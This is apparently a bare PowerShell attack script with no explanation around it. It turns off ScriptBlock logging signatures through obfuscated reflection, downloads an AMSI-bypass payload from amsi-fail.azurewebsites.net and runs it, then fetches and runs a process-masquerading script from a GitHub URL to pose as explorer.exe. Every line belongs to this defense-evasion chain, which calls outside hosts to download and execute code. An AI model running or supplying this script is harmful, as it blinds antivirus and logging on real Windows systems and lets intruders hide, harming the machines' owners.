[ScriptBlock]."GetFiel`d"('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
$accessAMBY = Invoke-WebRequest https://amsi-fail.azurewebsites.net/api/Generate  -UseBasicParsing
Invoke-Expression $accessAMBY.Content
Invoke-Expression(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/GetRektBoy724/sementara/master/Masquerade-PEB.ps1');
MPEB -BinPath "C:\Windows\explorer.exe"
MPEB -BinPath "C:\Windows\explorer.exe"